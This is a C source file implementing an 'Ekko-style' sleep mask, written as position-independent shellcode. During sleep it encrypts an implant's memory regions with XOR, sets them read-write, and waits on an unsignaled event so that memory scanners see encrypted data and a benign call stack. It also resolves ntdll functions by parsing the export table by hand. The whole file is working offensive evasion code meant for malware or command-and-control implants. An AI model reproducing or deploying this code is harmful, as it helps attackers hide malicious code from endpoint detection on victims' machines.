// ekko_timer — Ekko-style sleep obfuscation via NtWaitForSingleObject.
//
// Thread blocks on NtWaitForSingleObject with an unsignaled event.
// Memory encrypted (XOR-16) and marked PAGE_READWRITE during sleep.
// Thread call stack at scan time shows ntdll!NtWaitForSingleObject.

#include "../../sleep_mask_api.h"

// Forward declarations — helpers MUST be defined AFTER sleep_mask_entry
// so that sleep_mask_entry is at offset 0 of .text (PIC requirement).
static int   pic_strcmp(const char* a, const char* b);
static void* pic_get_proc(void* module_base, const char* func_name);
static void  xor_regions(SleepMaskCtx* ctx);

typedef NTSTATUS (__stdcall *pfn_NtCreateEvent)(HANDLE*, DWORD, void*, int, BOOL);
typedef NTSTATUS (__stdcall *pfn_NtClose)(HANDLE);

// ---- ENTRY POINT (must be first defined function) -------------------------

void __cdecl sleep_mask_entry(SleepMaskCtx* ctx) {
    uint32_t i;
    SIZE_T sz;
    PVOID base;
    ULONG old_prot;

    // Строки на стеке — на x86 литералы генерируют абсолютные адреса,
    // которые невалидны в PIC-шелкоде.
    char s_nce[] = {'N','t','C','r','e','a','t','e','E','v','e','n','t',0};
    char s_nc[]  = {'N','t','C','l','o','s','e',0};

    pfn_NtCreateEvent NtCreateEvent =
        (pfn_NtCreateEvent)pic_get_proc(ctx->ntdll_base, s_nce);
    pfn_NtClose NtClose =
        (pfn_NtClose)pic_get_proc(ctx->ntdll_base, s_nc);

    if (!NtCreateEvent || !NtClose)
        goto fallback;

    HANDLE hEvent = 0;
    if (NtCreateEvent(&hEvent, 0x1F0003, 0, 1, FALSE) < 0)
        goto fallback;

    // 1. Protect RW.
    for (i = 0; i < ctx->region_count; ++i) {
        base = ctx->regions[i].base;
        sz   = (SIZE_T)ctx->regions[i].size;
        ctx->NtProtectVirtualMemory(
            ctx->process_handle, &base, &sz, 0x04, &old_prot);
    }

    // 2. XOR encrypt.
    xor_regions(ctx);

    // 3. Wait — thread stack shows ntdll!NtWaitForSingleObject.
    {
        LARGE_INTEGER timeout;
        timeout.QuadPart = -(LONGLONG)ctx->sleep_ms * 10000LL;
        ctx->NtWaitForSingleObject(hEvent, FALSE, &timeout);
    }

    // 4. XOR decrypt.
    xor_regions(ctx);

    // 5. Restore protection.
    for (i = 0; i < ctx->region_count; ++i) {
        base = ctx->regions[i].base;
        sz   = (SIZE_T)ctx->regions[i].size;
        ctx->NtProtectVirtualMemory(
            ctx->process_handle, &base, &sz,
            (ULONG)ctx->regions[i].original_prot, &old_prot);
    }

    // 6. Flush + cleanup.
    ctx->FlushInstructionCache(ctx->process_handle, 0, 0);
    NtClose(hEvent);
    return;

fallback:
    for (i = 0; i < ctx->region_count; ++i) {
        base = ctx->regions[i].base;
        sz   = (SIZE_T)ctx->regions[i].size;
        ctx->NtProtectVirtualMemory(
            ctx->process_handle, &base, &sz, 0x04, &old_prot);
    }
    xor_regions(ctx);
    {
        LARGE_INTEGER delay;
        delay.QuadPart = -(LONGLONG)ctx->sleep_ms * 10000LL;
        ctx->NtDelayExecution(FALSE, &delay);
    }
    xor_regions(ctx);
    for (i = 0; i < ctx->region_count; ++i) {
        base = ctx->regions[i].base;
        sz   = (SIZE_T)ctx->regions[i].size;
        ctx->NtProtectVirtualMemory(
            ctx->process_handle, &base, &sz,
            (ULONG)ctx->regions[i].original_prot, &old_prot);
    }
    ctx->FlushInstructionCache(ctx->process_handle, 0, 0);
}

// ---- Helpers (defined AFTER entry point) ----------------------------------

static void xor_regions(SleepMaskCtx* ctx) {
    for (uint32_t i = 0; i < ctx->region_count; ++i) {
        uint8_t* p = (uint8_t*)ctx->regions[i].base;
        uint32_t L = ctx->regions[i].size;
        for (uint32_t n = 0; n < L; ++n)
            p[n] ^= ctx->key[n & 15];
    }
}

static int pic_strcmp(const char* a, const char* b) {
    while (*a && *a == *b) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

static void* pic_get_proc(void* module_base, const char* func_name) {
    unsigned char* base = (unsigned char*)module_base;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY* exp_dir = &nt->OptionalHeader.DataDirectory[0];
    if (!exp_dir->VirtualAddress) return 0;
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + exp_dir->VirtualAddress);
    DWORD* names    = (DWORD*)(base + exp->AddressOfNames);
    WORD*  ordinals = (WORD*)(base + exp->AddressOfNameOrdinals);
    DWORD* funcs    = (DWORD*)(base + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        if (pic_strcmp((const char*)(base + names[i]), func_name) == 0)
            return (void*)(base + funcs[ordinals[i]]);
    }
    return 0;
}
